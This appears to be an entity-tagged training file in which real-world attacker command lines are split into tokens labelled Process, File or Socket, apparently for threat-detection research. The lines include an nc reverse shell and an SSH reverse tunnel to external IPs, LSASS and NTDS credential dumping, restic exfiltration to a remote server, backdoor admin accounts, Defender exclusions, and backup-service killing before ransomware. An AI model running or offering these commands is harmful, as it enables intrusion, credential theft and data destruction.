+Import-Module B-Process
+C:\windows\system32\powershellintelmodule.psm1 B-File
+
+portfwd B-Process
+add O
+-R O
+-p O
+89474 O
+-l O
+4453 O
+-L O
+192.169.6.122 B-Socket
+
+nc B-Process
+-e O
+/bin/bash B-Process
+104.200.67.3 B-Socket
+1608 O
+2> O
+/dev/null B-File
+
+rundll32 B-Process
+C:\Users\[REDACTED]\AppData\Local\Temp\easygoing.dat,#1 B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/c O
+D:\max\eyewear.bat B-File
+
+xcopy B-Process
+/s O
+/i O
+/e O
+/h O
+max\easygoing.dat B-File
+C:\Users\[REDACTED]\AppData\Local\Temp\* B-File
+
+C:\Windows\system32\svchost.exe B-Process
+-k O
+netsvcs B-Process
+-p O
+-s O
+Schedule O
+
+rundll32.exe B-Process
+"C:\Users\[REDACTED]\AppData\Local\[REDACTED]\[REDACTED]\Utucka.dll",#1 B-File
+--oxoj="CategoryBeyond\license.dat" O
+
+cmd.exe B-Process
+/c O
+echo B-Process
+nbproc O
+> O
+\\.\pipe\nbproc B-Socket
+
+cmd.exe B-Process
+/c O
+echo B-Process
+xgxfpw O
+> O
+\\.\pipe\xgxfpw B-File
+
+cmd.exe B-Process
+/c O
+echo B-Process
+ylfdup O
+> O
+\\.\pipe\ylfdup B-File
+
+powershell.exe B-Process
+Uninstall-WindowsFeature O
+-Name O
+Windows-Defender-GUI B-File
+
+c:\windows\temp\procdump64.exe B-Process
+-accepteula O
+-ma O
+lsass.exe B-Process
+fwtsqmfile00.dmp B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+dir B-Process
+/s O
+*file/ O
+Microsoft.ActiveDirectory.Management.dll B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+where O
+/r O
+C:\Windows\WinSxS\ B-File
+*Microsoft.ActiveDirectory.Management.dll* B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+powershell B-Process
+-c O
+"get-eventlog O
+'Security' O
+| O
+where O
+{$_.Message O
+-like O
+'*<REDACTED>*' O
+-AND O
+'Source O
+Network O
+Address'} O
+| O
+export-csv O
+c:\windows\temp\events_<REDACTED>.txt" B-File
+
+adfind.exe B-Process
+-f O
+(objectcategory=person) O
+> O
+ad_users.txt B-File
+
+adfind.exe B-Process
+-f O
+objectcategory=computer O
+-csv O
+name O
+operatingSystem O
+> O
+ad_computers_enum.txt B-File
+
+adfind.exe B-Process
+-gcb O
+-sc O
+trustdmp B-File
+> O
+ad_trustdmp.txt B-File
+
+wmic B-Process
+/node:<REDACTED> B-Socket
+/user:"<REDACTED>" O
+/password:"<REDACTED>" O
+logicaldisk B-File
+get O
+caption,description,drivetype,providername,volumename O
+
+C:\Windows\System32\cmd.exe B-Process
+/C O
+dir B-Process
+\\[REDACTED B-File
+HOST]\c$\users I-File
+>> O
+listing.txt B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+locker_64.exe B-Process
+
+schtasks.exe B-Process
+/create O
+/sc O
+minute O
+/mo O
+1 O
+/tn O
+"SSH Server" O
+/rl O
+highest O
+/tr O
+"C:\ProgramData\sshd\sshd.exe B-Process
+-f O
+C:\ProgramData\sshd\config\sshd_config" B-File
+
+schtasks.exe B-Process
+/create O
+/sc O
+minute O
+/mo O
+1 O
+/tn O
+"SSH Key Exchange" O
+/rl O
+highest O
+/tr O
+"C:\ProgramData\sshd\ssh.exe B-Process
+-i O
+C:\ProgramData\sshd\config\keys\id_rsa B-File
+-N O
+-R O
+369:127.0.0.1:2222 B-Socket
+root@185.206.146.129 B-Socket
+-o O
+StrictHostKeyChecking=no O
+-o O
+ServerAliveInterval=60 O
+-o O
+ServerAliveCountMax=15" O
+
+schtasks.exe B-Process
+/create O
+/sc O
+minute O
+/mo O
+1 O
+/tn O
+"SSH Key Exchange" O
+/rl O
+highest O
+/tr O
+C:\ProgramData\sshd\ssh.exe B-Process
+-i O
+C:\ProgramData\sshd\config\keys\id_rsa B-File
+-N O
+-R O
+369:127.0.0.1:2222 B-Socket
+root@185.206.146.129 B-Socket
+-o O
+StrictHostKeyChecking=no O
+-o O
+ServerAliveInterval=60 O
+-o O
+ServerAliveCountMax=15 O
+
+net B-Process
+user O
+WDAGUtilityAccount2 B-File
+Decryptme1488@ O
+/add O
+
+net B-Process
+localgroup O
+Administrators B-File
+WDAGUtilityAccount2 B-File
+/add O
+
+net B-Process
+localgroup O
+"Remote B-File
+Desktop I-File
+Users" I-File
+WDAGUtilityAccount2 B-File
+/add O
+
+cmd.exe B-Process
+/C O
+netsh B-Process
+advfirewall O
+firewall O
+add O
+rule O
+dir=in O
+name="DCOM" O
+program=C:\Windows\system32\svchost.exe B-Process
+service=rpcss O
+action=allow O
+protocol=TCP O
+localport=135 O
+> O
+C:\Windows\Temp\VlPWyecW.tmp B-File
+2>&1 O
+
+cmd.exe B-Process
+/C O
+netsh B-Process
+advfirewall O
+firewall O
+add O
+rule O
+dir=in O
+name="DCOM" O
+program=C:\Windows\system32\svchost.exe B-Process
+service=rpcss O
+action=allow O
+protocol=TCP O
+localport=135 O
+> O
+C:\Windows\Temp\pOrnerOW.tmp B-File
+2>&1 O
+
+cmd.exe B-Process
+/C O
+netsh B-Process
+advfirewall O
+firewall O
+add O
+rule O
+dir=in O
+name O
+="WMI" O
+program=C:\Windows\system32\svchost.exe B-Process
+service=winmgmt O
+action O
+= O
+allow O
+protocol=TCP O
+localport=any O
+> O
+C:\Windows\Temp\XsssmLZZ.tmp B-File
+2>&1 O
+
+cmd.exe B-Process
+/C O
+netsh B-Process
+advfirewall O
+firewall O
+add O
+rule O
+dir=in O
+name O
+="UnsecApp" O
+program=C:\Windows\system32\wbem\unsecapp.exe B-Process
+action=allow O
+> O
+C:\Windows\Temp\HaALurWi.tmp B-File
+2>&1 O
+
+cmd.exe B-Process
+/C O
+netsh B-Process
+advfirewall O
+firewall O
+add O
+rule O
+dir=out O
+name O
+="WMI_OUT" O
+program=C:\Windows\system32\svchost.exe B-Process
+service=winmgmt O
+action=allow O
+protocol=TCP O
+localport=any O
+> O
+C:\Windows\Temp\WkiMfXXo.tmp B-File
+2>&1 O
+
+cmd.exe B-Process
+/Q O
+/c O
+expand B-Process
+cache.cab B-File
+-F:* O
+c:\programdata B-File
+
+cmd.exe B-Process
+/Q O
+/c O
+start O
+"" O
+%%programdata%%\schcache\mswow86.exe B-File
+
+cmd.exe B-Process
+/Q O
+/c O
+schtasks.exe B-Process
+/create O
+/sc O
+onlogon O
+/tn O
+"Wow64 Subsystem" O
+/rl O
+highest O
+/tr O
+"%%programdata%%\schcache\mswow86.exe B-File
+
+cmd.exe B-Process
+/Q O
+/c O
+schtasks.exe B-Process
+/create O
+/sc O
+onlogon O
+/tn O
+"Wow64 Subsystem" O
+/rl O
+highest O
+/tr O
+"%%programdata%%\schcache\mswow86.exe" B-File
+
+powershell.exe B-Process
+"ntdsutil.exe B-Process
+'ac O
+i O
+ntds' O
+'ifm' O
+'create O
+full O
+c:\users\public\ntds B-File
+q O
+q" O
+
+powershell.exe B-Process
+"ntdsutil.exe B-Process
+'ac O
+i O
+ntds' O
+'ifm' O
+'create O
+full O
+c:\ProgramData\ntdsutil B-File
+q O
+q" O
+
+cmd.exe B-Process
+/C O
+net B-Process
+group O
+/domain O
+> O
+C:\Windows\Temp\aWatKmSa.tmp B-File
+2>&1 O
+
+cmd.exe B-Process
+/Q O
+/c O
+cmdkey B-Process
+/list O
+1> O
+\\127.0.0.1\ADMIN$\__REDACTED B-File
+2>&1 O
+
+cmd.exe B-Process
+/Q O
+/c O
+dor B-Process
+1> O
+\\127.0.0.1\ADMIN$\____REDACTED B-File
+2>&1 O
+
+cmd.exe B-Process
+/Q O
+/c O
+whoami O
+1> O
+\\127.0.0.1\ADMIN$\____REDACTED B-File
+2>&1 O
+
+cmd.exe B-Process
+/Q O
+/c O
+cd B-Process
+\ O
+1> O
+\\127.0.0.1\ADMIN$\____REDACTED B-File
+2>&1 O
+
+cmd.exe B-Process
+/Q O
+/c O
+cd B-Process
+programdata O
+1> O
+\\127.0.0.1\ADMIN$\____REDACTED B-File
+2>&1 O
+
+cmd.exe B-Process
+/Q O
+/c O
+cd B-Process
+1> O
+\\127.0.0.1\ADMIN$\____REDACTED B-File
+2>&1 O
+
+cmd.exe B-Process
+/Q O
+/c O
+ls B-Process
+1> O
+\\127.0.0.1\ADMIN$\____REDACTED B-File
+2>&1 O
+
+cmd.exe B-Process
+/Q O
+/c O
+dir B-Process
+1> O
+\\127.0.0.1\ADMIN$\____REDACTED B-File
+2>&1 O
+
+cmd.exe B-Process
+/Q O
+/c O
+expand B-Process
+cache.cab B-File
+-F:* O
+c:\programdata B-File
+1> O
+\\127.0.0.1\ADMIN$\____REDACTED B-File
+2>&1 O
+
+cmd.exe B-Process
+/Q O
+/c O
+whoami O
+/all O
+1> O
+\\127.0.0.1\ADMIN$\____REDACTED B-File
+2>&1 O
+
+"C:\Program Files\7-Zip\7zG.exe" B-Process
+x O
+-o O
+"C:\Users\Public\netscan_portable\" B-File
+-spe O
+-an O
+-ai#7zMap24244:76:7zEvent17814 O
+
+powershell B-Process
+-w O
+hidden O
+-C O
+"Get-WinEvent B-Process
+-Logname O
+'security' O
+-FilterXPath O
+'*[System[EventID=4624]]' O
+-MaxEvents O
+1 O
+| O
+sort-object B-Process
+timeCreated O
+| O
+select-object B-Process
+-ExpandProperty O
+message" O
+
+powershell B-Process
+-w O
+hidden O
+-C O
+"Get-WinEvent B-Process
+-Logname O
+'security' O
+-FilterXPath O
+'*[System[EventID=4624]]' O
+| O
+sort-object B-Process
+timeCreated O
+| O
+select-object B-Process
+-ExpandProperty O
+message" O
+
+procdump64.exe B-Process
+-ma O
+lsass.exe B-Process
+lsass.dmp B-File
+
+schtasks B-Process
+/create O
+/ru O
+SYSTEM O
+/tn O
+"OneDrive Security Task-S-1-5-21-REDACTED" O
+/tr O
+c:\windows\adfs\py\UpdateEdge.bat B-File
+/SC O
+ONSTART O
+/F O
+
+schtasks B-Process
+/create O
+/ru O
+SYSTEM O
+/tn O
+"OneDrive Security Task-S-1-5-21-REDACTED" O
+/tr O
+C:\Users\REDACTED\AppData\Local\Notepad\upedge.bat B-File
+/SC O
+ONSTART O
+/F O
+
+schtasks B-Process
+/create O
+/ru O
+SYSTEM O
+/tn O
+"OneDrive Security Task-S-1-5-21-REDACTED" O
+/tr O
+c:\users\REDACTED\appdata\local\notepad\UpdateEdge.bat B-File
+/SC O
+ONSTART O
+/F O
+
+schtasks B-Process
+/create O
+/ru O
+SYSTEM O
+/tn O
+"OneDrive Security Task-S-1-5-21-REDACTED" O
+/tr O
+C:\Users\REDACTED\AppData\Local\Notepad\upedge.bat B-File
+/sc O
+MINUTE O
+/mo O
+720 O
+/F O
+
+schtasks B-Process
+/create O
+/ru O
+SYSTEM O
+/tn O
+"OneDrive Security Task-S-1-5-21-REDACTED" O
+/tr O
+c:\users\REDACTED\appdata\local\notepad\UpdateEdge.bat B-File
+/sc O
+MINUTE O
+/mo O
+720 O
+/F O
+
+schtasks B-Process
+/create O
+/ru O
+SYSTEM O
+/tn O
+"OneDrive Security Task-S-1-5-21-REDACTED" O
+/tr O
+c:\windows\adfs\py\UpdateEdge.bat B-File
+/sc O
+MINUTE O
+/mo O
+720 O
+/F O
+
+schtasks B-Process
+/create O
+/I O
+1 O
+/TR O
+C:\Users\REDACTED\AppData\Local\Notepad\UpdateEG.bat B-File
+/TN O
+UpdateEdge O
+/SC O
+ONIDLE O
+
+schtasks B-Process
+/create O
+/I O
+1 O
+/TR O
+C:WindowsTempUpdate.exe B-Process
+/TN O
+UpdateEdge O
+/SC O
+ONIDLE O
+
+cmd.exe B-Process
+/C O
+reg B-Process
+add O
+"HKLM\software\microsoft\windows B-File
+nt\currentversion\winlogon" I-File
+/v O
+UserInit O
+/t O
+reg_sz O
+/d O
+"c:\windows\system32\userinit.exe,c:\users\[REDACTED]\appdata\local\notepad\UpdateEdge.bat B-File
+
+restic.exe B-Process
+-r O
+rest:http://195.123.226.84:8000/ B-Socket
+init O
+--password-file O
+ppp.txt B-File
+
+restic.exe B-Process
+-r O
+rest:http://195.123.226.84:8000/ B-Socket
+--password-file O
+ppp.txt B-File
+--use-fs-snapshot O
+--verbose O
+backup B-Process
+"F:\Shares\<REDACTED>\<REDACTED>" B-File
+
+cmd.exe B-Process
+/C O
+PsExec64.exe B-Process
+-accepteula O
+\\<DOMAIN-CONTROLLER-IP> B-Socket
+-c O
+-f O
+-d O
+-s O
+up.bat B-File
+
+cmd.exe B-Process
+/C O
+for O
+/f O
+%a O
+in O
+(pc.txt) B-File
+do O
+copy O
+/y O
+\\<REDACTED>\c\$\<REDACTED>.exe B-File
+\\%a\c\$\<REDACTED>.exe B-File
+
+cmd.exe B-Process
+/C O
+PsExec64.exe B-Process
+-accepteula O
+@pc.txt B-File
+-c O
+-f O
+-d O
+-h O
+1.bat B-File
+
+reg B-Process
+add O
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce B-File
+/v O
+*a O
+/t O
+REG_SZ O
+/d O
+"cmd.exe B-Process
+/c O
+C:\<REDACTED-COMPANY-NAME>.exe" B-File
+/f O
+
+reg B-Process
+add O
+"HKLM\SOFTWARE\Microsoft\Windows B-File
+NT\CurrentVersion\Winlogon" I-File
+/v O
+DefaultUserName O
+/t O
+REG_SZ O
+/d O
+<REDACTED-DOMAIN-NAME>\backup2 B-File
+/f O
+
+reg B-Process
+add O
+"HKLM\SOFTWARE\Microsoft\Windows B-File
+NT\CurrentVersion\Winlogon" I-File
+/v O
+DefaultPassword O
+/t O
+REG_SZ O
+/d O
+JapanNight!128 O
+/f O
+
+schtasks.exe B-Process
+/Create O
+/F O
+/XML O
+C:\windows\temp\Wininet.xml B-File
+/tn O
+'\Microsoft\Windows\Maintenance\Wininet' B-File
+
+powershell.exe B-Process
+/c O
+net B-Process
+user O
+/add O
+DefaultAccount B-File
+P@ssw0rd123412; O
+
+net B-Process
+user O
+DefaultAccount B-File
+/active:yes; O
+
+net B-Process
+user O
+DefaultAccount B-File
+P@ssw0rd12341234; O
+
+net B-Process
+localgroup O
+Administrators B-File
+/add O
+DefaultAccount; B-File
+
+net B-Process
+localgroup O
+'Remote B-File
+Desktop I-File
+Users' I-File
+/add O
+DefaultAccount; B-File
+
+schtasks.exe B-Process
+/Create O
+/F O
+/XML O
+%wintmp%\Wininet.xml B-File
+/tn O
+'\Microsoft\Windows\Maintenance\Wininet' B-File
+
+"powershell.exe" B-Process
+/c O
+Remove-Item O
+-Path O
+C:\windows\temp\ssasl.pmd B-File
+-Focus O
+-ErrorAction O
+Ignore; O
+rundll32.exe B-Process
+C:\windows\System32\comsvcs.dll, B-File
+MiniDump O
+(Get-Process O
+lsass).id O
+C:\windows\temp\ssasl.pmd B-File
+full O
+| O
+out-host; B-Process
+Compress-Archive B-Process
+C:\windows\temp\ssasl.pmd B-File
+C:\windows\temp\ssasl.zip B-File
+
+schtasks B-Process
+/create O
+/tn O
+K0adic O
+/tr O
+"C:\Windows\system32\mshta.exe B-Process
+C:\ProgramData\SZWXNUHHDP.hta" B-File
+/sc O
+onlogon O
+/ru O
+System O
+/f O
+
+procdump.exe B-Process
+-accepteula O
+-ma O
+lsass.exe B-Process
+mem.dmp B-File
+
+PsExec.exe B-Process
+-d O
+\\HOST B-Socket
+-u O
+"DOMAIN\USER" O
+-p O
+"PASSWORD" O
+-accepteula O
+-s O
+cmd B-Process
+/c O
+"powershell.exe B-Process
+-ExecutionPolicy O
+Bypass O
+-file O
+\\DOMAINCONTROLLER\share$\p.ps1" B-File
+
+schtasks.exe B-Process
+/Create O
+/F O
+/TN O
+"{97F2F70B-10D1-4447-A2F3-9B070C86E261}" O
+/TR O
+"cmd B-Process
+/c O
+start O
+/min O
+\"\" O
+powershell.exe B-Process
+-Command O
+IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty O
+-Path O
+HKCU:\SOFTWARE\Pvoeooxf).yzbbvhhdypa))) O
+" O
+/SC O
+MINUTE O
+/MO O
+30 O
+
+C:\redacted\find.exe B-Process
+-f O
+objectcategory=computer O
+-csv O
+name O
+cn O
+OperatingSystem O
+dNSHostName O
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+wmic B-Process
+/namespace:\\root\SecurityCenter2 B-File
+PATH O
+AntiSpywareProduct O
+GET O
+/value O
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+wmic B-Process
+/namespace:\\root\SecurityCenter2 B-File
+PATH O
+AntiSpywareProduct O
+GET O
+/value O
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+wmic B-Process
+/namespace:\\root\SecurityCenter2 B-File
+PATH O
+AntiVirusProduct O
+GET O
+/value O
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+wmic B-Process
+/namespace:\\root\SecurityCenter2 B-File
+PATH O
+FirewallProduct O
+GET O
+/value O
+
+REG B-Process
+ADD O
+"HKLM\SYSTEM\CurrentControlSet\Control\Terminal B-File
+Server\WinStations\RDP-Tcp" I-File
+/t O
+REG_DWORD O
+/v O
+"MaxInstanceCount" O
+/d O
+0xffffffff O
+/f O
+
+REG B-Process
+ADD O
+"HKLM\SYSTEM\CurrentControlSet\Control\Terminal B-File
+Server\WinStations\RDP-Tcp" I-File
+/t O
+REG_DWORD O
+/v O
+"fEnableWinStation" O
+/d O
+1 O
+/f O
+
+REG B-Process
+ADD O
+"HKLM\SYSTEM\CurrentControlSet\Control\Terminal B-File
+Server" I-File
+/t O
+REG_DWORD O
+/v O
+"TSUserEnabled" O
+/d O
+0 O
+/f O
+
+REG B-Process
+ADD O
+"HKLM\SYSTEM\CurrentControlSet\Control\Terminal B-File
+Server" I-File
+/t O
+REG_DWORD O
+/v O
+"TSEnabled" O
+/d O
+1 O
+/f O
+
+REG B-Process
+ADD O
+"HKLM\SYSTEM\CurrentControlSet\Control\Terminal B-File
+Server" I-File
+/t O
+REG_DWORD O
+/v O
+"TSAppCompat" O
+/d O
+0 O
+/f O
+
+REG B-Process
+ADD O
+"HKLM\SYSTEM\CurrentControlSet\Control\Terminal B-File
+Server" I-File
+/t O
+REG_DWORD O
+/v O
+"IdleWinStationPoolCount" O
+/d O
+1 O
+/f O
+
+REG B-Process
+ADD O
+"HKLM\SYSTEM\CurrentControlSet\Control\Terminal B-File
+Server" I-File
+/t O
+REG_DWORD O
+/v O
+"TSAdvertise" O
+/d O
+1 O
+/f O
+
+REG B-Process
+ADD O
+"HKLM\SYSTEM\CurrentControlSet\Control\Terminal B-File
+Server" I-File
+/t O
+REG_DWORD O
+/v O
+"AllowTSConnections" O
+/d O
+1 O
+/f O
+
+REG B-Process
+ADD O
+"HKLM\SYSTEM\CurrentControlSet\Control\Terminal B-File
+Server\Licensing I-File
+Core" I-File
+/t O
+REG_DWORD O
+/v O
+"EnableConcurrentSessions" O
+/d O
+1 O
+/f O
+
+REG B-Process
+ADD O
+"HKLM\SYSTEM\CurrentControlSet\Control\Terminal B-File
+Server" I-File
+/t O
+REG_DWORD O
+/v O
+"fSingleSessionPerUser" O
+/d O
+0 O
+/f O
+
+C:\Windows\system32\reg.exe B-Process
+ADD O
+"HKLM\SOFTWARE\Microsoft\Microsoft B-File
+Antimalware\Exclusions\Paths" I-File
+/f O
+/t O
+REG_DWORD O
+/v O
+"C:\ProgramData\Microsoft\Oweboiqnb" B-File
+/d O
+"0" O
+
+C:\Windows\system32\reg.exe B-Process
+ADD O
+"HKLM\SOFTWARE\Microsoft\Microsoft B-File
+Antimalware\Exclusions\Paths\" I-File
+/f O
+/t O
+REG_DWORD O
+/v O
+"C:\ProgramData\Microsoft\Oweboiqnb" B-File
+/d O
+"0" O
+
+C:\Windows\system32\reg.exe B-Process
+ADD O
+"HKLM\SOFTWARE\Microsoft\Windows B-File
+Defender\Exclusions\Paths" I-File
+/f O
+/t O
+REG_DWORD O
+/v O
+"C:\ProgramData\Microsoft\Oweboiqnb" B-File
+/d O
+"0" O
+
+C:\Windows\system32\reg.exe B-Process
+ADD O
+"HKLM\SOFTWARE\Microsoft\Windows B-File
+Defender\Exclusions\Paths\" I-File
+/f O
+/t O
+REG_DWORD O
+/v O
+"C:\ProgramData\Microsoft\Oweboiqnb" B-File
+/d O
+"0" O
+
+cmd.exe B-Process
+/c O
+rmdir B-Process
+/S O
+/Q O
+"C:\Users\REDACTED\EmailStorage_REDACTED-REDACTED_REDACTED" B-File
+
+"%WINDIR%\system32\NOTEPAD.EXE" B-Process
+C:\Decryption_INFO.txt B-File
+
+"%WINDIR%\system32\cmd.exe" B-Process
+/c O
+net B-Process
+localgroup O
+administrators O
+sqlbackup B-Process
+/add O
+
+"%WINDIR%\system32\cmd.exe" B-Process
+/c O
+net B-Process
+user O
+sqlbackup B-Process
+Password!1221! O
+/add O
+
+"C:\Program Files\7-Zip\7zG.exe" B-Process
+x O
+-o O
+"C:\Users\Public\netscan_portable" B-File
+-spe O
+-an O
+-ai#7zMap24244:76:7zEvent17814 O
+
+"C:\Windows\System32\Wbem\WMIC.exe" B-Process
+logicaldisk B-File
+
+"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" B-Process
+-command O
+Get-Process O
+
+C:\Windows\System32\net.exe B-Process
+stop O
+"samss" B-Process
+/y O
+
+C:\Windows\System32\net.exe B-Process
+stop O
+"veeamcatalogsvc" B-Process
+/y O
+
+C:\Windows\System32\net.exe B-Process
+stop O
+"veeamcloudsvc" B-Process
+/y O
+
+C:\Windows\System32\net.exe B-Process
+stop O
+"veeamdeploysvc" B-Process
+/y O
+
+C:\Windows\System32\net.exe B-Process
+/CREATE O
+/SC O
+ONCE O
+/ST O
+17:21:58 O
+/TN O
+9T6ukfi6 O
+/TR O
+"'C:\Users\pagefilerpqy.exe'" B-File
+/f O
+
+"C:\Windows\System32\schtasks.exe" B-Process
+/CREATE O
+/SC O
+ONCE O
+/ST O
+17:21:58 O
+/TN O
+9T6ukfi6 O
+/TR O
+"'C:\Users\pagefilerpqy.exe'" B-File
+/f O
+/RL O
+HIGHEST O
+
+"C:\Windows\System32\schtasks.exe" B-Process
+/CREATE O
+/SC O
+ONSTART O
+/TN O
+jf0c O
+/TR O
+"'C:\Users\pagefilerpqy.exe'" B-File
+/f O
+
+"C:\Windows\System32\schtasks.exe" B-Process
+/CREATE O
+/SC O
+ONSTART O
+/TN O
+jf0c O
+/TR O
+"'C:\Users\pagefilerpqy.exe'" B-File
+/f O
+/RL O
+HIGHEST O
+
+C:\Windows\System32\taskkill.exe B-Process
+/IM O
+sqlbrowser.exe B-Process
+/F O
+
+C:\Windows\System32\taskkill.exe B-Process
+/IM O
+sqlceip.exe B-Process
+/F O
+
+C:\Windows\System32\taskkill.exe B-Process
+/IM O
+sqlservr.exe B-Process
+/F O
+
+C:\Windows\System32\taskkill.exe B-Process
+/IM O
+sqlwriter.exe B-Process
+/F O
+
+C:\Windows\System32\taskkill.exe B-Process
+/IM O
+veeam.backup.agent.configurationservice.exe B-Process
+/F O
+
+C:\Windows\System32\taskkill.exe B-Process
+/IM O
+veeam.backup.brokerservice.exe B-Process
+/F O
+
+C:\Windows\System32\taskkill.exe B-Process
+/IM O
+veeam.backup.catalogdataservice.exe B-Process
+/F O
+
+C:\Windows\System32\taskkill.exe B-Process
+/IM O
+veeam.backup.cloudservice.exe B-Process
+/F O
+
+C:\Windows\System32\taskkill.exe B-Process
+/IM O
+veeam.backup.externalinfrastructure.dbprovider.exe B-Process
+/F O
+
+C:\Windows\System32\taskkill.exe B-Process
+/IM O
+veeam.backup.manager.exe B-Process
+/F O
+
+C:\Windows\System32\taskkill.exe B-Process
+/IM O
+veeam.backup.mountservice.exe B-Process
+/F O
+
+C:\Windows\System32\taskkill.exe B-Process
+/IM O
+veeam.backup.service.exe B-Process
+/F O
+
+C:\Windows\System32\taskkill.exe B-Process
+/IM O
+veeam.backup.uiserver.exe B-Process
+/F O
+
+C:\Windows\System32\taskkill.exe B-Process
+/IM O
+veeam.backup.wmiserver.exe B-Process
+/F O
+
+C:\Windows\System32\taskkill.exe B-Process
+/IM O
+veeam.guest.interaction.proxy.exe B-Process
+/F O
+
+C:\Windows\System32\taskkill.exe B-Process
+/IM O
+veeamdeploymentsvc.exe B-Process
+/F O
+
+C:\Windows\System32\taskkill.exe B-Process
+/IM O
+veeamfilesysvsssvc.exe B-Process
+/F O
+
+C:\Windows\System32\taskkill.exe B-Process
+/IM O
+veeamnfssvc.exe B-Process
+/F O
+
+C:\Windows\System32\taskkill.exe B-Process
+/IM O
+veeamtransportsvc.exe B-Process
+/F O
+
+"C:\Windows\system32\NOTEPAD.EXE" B-Process
+C:\Users\USER\Desktop\New Text Document.txt B-File
+
+"C:\Windows\system32\cmd.exe" B-Process
+/c O
+sc B-Process
+query O
+WinDefend O
+
+"C:\Windows\system32\cmd.exe" B-Process
+/c O
+time O
+
+"C:\Windows\system32\cmd.exe" B-Process
+/c O
+tzutil B-Process
+/g O
+
+"C:\Windows\system32\net.exe" B-Process
+accounts O
+
+C:\Windows\system32\net1 B-Process
+stop O
+"samss" B-Process
+/y O
+
+C:\Windows\system32\net1 B-Process
+stop O
+"veeamcatalogsvc" B-Process
+/y O
+
+C:\Windows\system32\net1 B-Process
+stop O
+"veeamcloudsvc" B-Process
+/y O
+
+C:\Windows\system32\net1 B-Process
+stop O
+"veeamdeploysvc" B-Process
+/y O
+
+"C:\Windows\system32\taskmgr.exe" B-Process
+/4 O
+
+"C:\Windows\system32\wbem\wmiprvse.exe B-Process
+-Embedding" O
+
+"C:\Windows\system32\wbem\wmiprvse.exe B-Process
+-secured O
+-Embedding" O
+
+"C:\Windows\system32\whoami.exe" B-Process
+/all O
+
+"C:\\Windows\\System32\\rundll32.exe\" B-Process
+C:/Windows/Temp//rvhz1.dll B-File
+DllRegisterServer O
+
+"cmd.exe" B-Process
+/c O
+%USERPROFILE%\AppData\bigfile.exe B-Process
+-i O
+-c O
+%USERPROFILE%\AppData\1.bat B-File
+
+"cmd.exe" B-Process
+/c O
+DEL B-Process
+%USERPROFILE%\AppData\1.bat B-File
+
+"cmd.exe" B-Process
+/c O
+DEL B-Process
+%USERPROFILE%\AppData\bigfile.exe B-File
+
+"cmd.exe" B-Process
+/c O
+DEL B-Process
+%USERPROFILE%\AppData\bigfile.txt B-File
+
+"cmd.exe" B-Process
+/c O
+REG B-Process
+ADD O
+"HKLM\SOFTWARE\Microsoft\Windows B-File
+NT\CurrentVersion\Image I-File
+File I-File
+Execution I-File
+Options\smss.exe" I-File
+/f O
+/v O
+Debugger O
+/t O
+REG_SZ O
+/d O
+"C:\windows\system32\svchost.exe" B-File
+
+"cmd.exe" B-Process
+/c O
+certutil B-Process
+-decode O
+%USERPROFILE%\AppData\bigfile.txt B-File
+%USERPROFILE%\AppData\bigfile.exe B-File
+
+icacls B-Process
+"C:\*" B-File
+/grant O
+Everyone:F O
+/T O
+/C O
+/Q O
+
+icacls B-Process
+"C:\*" B-File
+/grant O
+Everyone:F O
+/T O
+/C O
+/Q O
+
+%WINDIR%\system32\cmd.exe B-Process
+/C O
+net B-Process
+user O
+REDACTED O
+/dom O
+
+%WINDIR%\system32\cmd.exe B-Process
+/C O
+net B-Process
+usre O
+REDACTED O
+/dom O
+
+%WINDIR%\system32\cmd.exe B-Process
+/C O
+nslookup B-Process
+
+%WINDIR%\system32\cmd.exe B-Process
+/C O
+ping B-Process
+-n O
+1 O
+<DOMAIN> O
+
+%WINDIR%\system32\cmd.exe B-Process
+/C O
+query B-Process
+session I-Process
+
+%WINDIR%\system32\cmd.exe B-Process
+/C O
+wmic B-Process
+/node:"REDACTED" B-Socket
+process O
+call O
+create O
+"%WINDIR%\Temp\svhost.exe B-File
+'143.244.146[.]183'" B-Socket
+
+%WINDIR%\system32\cmd.exe B-Process
+/c O
+net B-Process
+localgroup O
+administrators O
+sqlbackup B-Process
+/add O
+
+%WINDIR%\system32\cmd.exe B-Process
+/c O
+net B-Process
+user O
+sqlbackup B-Process
+Password!1221! O
+/add O
+
+7z_19.exe B-Process
+x O
+C:\Users\Public\archive_19.7z B-File
+-so O
+> O
+nul O
+
+7z_21.exe B-Process
+x O
+C:\Users\Public\archive_21.7z B-File
+-so O
+> O
+nul O
+
+7z_34.exe B-Process
+x O
+C:\Users\Public\archive_34.7z B-File
+-so O
+> O
+nul O
+
+7z_43.exe B-Process
+x O
+C:\Users\Public\archive_43.7z B-File
+-so O
+> O
+nul O
+
+7z_58.exe B-Process
+x O
+C:\Users\Public\archive_58.7z B-File
+-so O
+> O
+nul O
+
+7z_62.exe B-Process
+x O
+C:\Users\Public\archive_62.7z B-File
+-so O
+> O
+nul O
+
+7z_68.exe B-Process
+x O
+C:\Users\Public\archive_68.7z B-File
+-so O
+> O
+nul O
+
+7z_72.exe B-Process
+x O
+C:\Users\Public\archive_72.7z B-File
+-so O
+> O
+nul O
+
+7z_85.exe B-Process
+x O
+C:\Users\Public\archive_85.7z B-File
+-so O
+> O
+nul O
+
+7z_89.exe B-Process
+x O
+C:\Users\Public\archive_89.7z B-File
+-so O
+> O
+nul O
+
+7z_91.exe B-Process
+x O
+C:\Users\Public\archive_91.7z B-File
+-so O
+> O
+nul O
+
+7z_96.exe B-Process
+x O
+C:\Users\Public\archive_96.7z B-File
+-so O
+> O
+nul O
+
+<num>.exe B-Process
+-access-token O
+<token> O
+-v O
+-p O
+. O
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+shell O
+whoami O
+/all O
+
+C:\WINDOWS\SYSTEM32\NET1 B-Process
+GROUP O
+"DOMAIN B-File
+ADMINS" I-File
+NONAME O
+/DOMAIN O
+/ADD O
+
+C:\WINDOWS\SYSTEM32\NET1 B-Process
+GROUP O
+"ENTERPRISE B-File
